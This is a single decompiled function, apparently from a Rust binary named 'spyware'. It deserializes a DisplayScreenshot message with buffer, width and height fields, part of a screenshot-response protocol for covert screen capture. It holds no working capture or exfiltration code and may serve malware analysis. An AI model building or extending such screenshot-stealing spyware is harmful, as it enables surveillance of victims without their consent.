long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DisplayScreenshot>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "DisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 17);
    return a0;
}
